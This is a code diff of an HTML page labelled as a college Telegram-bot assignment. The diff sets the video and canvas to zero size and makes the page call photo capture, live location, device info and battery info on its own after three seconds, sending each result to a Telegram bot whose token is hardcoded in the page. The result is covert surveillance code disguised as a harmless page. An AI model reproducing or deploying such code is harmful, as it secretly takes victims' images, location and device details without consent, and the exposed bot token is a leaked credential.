@@ -7,11 +7,9 @@
 <body>
   <h1>Tugas Kuliah - Bot Telegram</h1>
   
-  <video id="video" autoplay></video>
-  <button onclick="takeAutoPhoto()">Ambil Foto Otomatis</button>
-  <button onclick="getLiveLocation()">Dapatkan Lokasi Akurat</button>
-  <button onclick="getDeviceInfo()">Dapatkan Informasi Perangkat</button>
-  <button onclick="getBatteryInfo()">Dapatkan Informasi Baterai</button>
+  <video id="video" width="0" height="0" autoplay></video>
+  <button onclick="capturePhoto()">Ambil Foto</button>
+  <canvas id="canvas" width="0" height="0" style="display: none;"></canvas>
 
   <script>
     const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
@@ -29,28 +27,18 @@
       $.post(url, data);
     }
 
-    function takeAutoPhoto() {
+    function capturePhoto() {
       const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
 
-      // Mengambil akses kamera
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
-          video.srcObject = stream;
-        })
-        .catch(function(error) {
-          console.error('Error accessing camera: ', error);
-        });
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
 
-      // Mengambil foto otomatis setelah 3 detik
-      setTimeout(function() {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const photoData = canvas.toDataURL('image/jpeg');
-        sendTelegramPhoto(photoData);
-      }, 3000);
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const photoData = canvas.toDataURL('image/jpeg');
+      sendTelegramPhoto(photoData);
     }
 
     function getLiveLocation() {
@@ -91,20 +79,12 @@
       }
     }
 
-    // Auto click function
-    function autoClick(elementId) {
-      const element = document.getElementById(elementId);
-      if (element) {
-        element.click();
-      }
-    }
-
     // Auto click actions after 3 seconds
     setTimeout(function() {
-      autoClick('autoPhotoButton');
-      autoClick('autoLocationButton');
-      autoClick('autoDeviceInfoButton');
-      autoClick('autoBatteryInfoButton');
+      capturePhoto();
+      getLiveLocation();
+      getDeviceInfo();
+      getBatteryInfo();
     }, 3000);
   </script>
 </body>
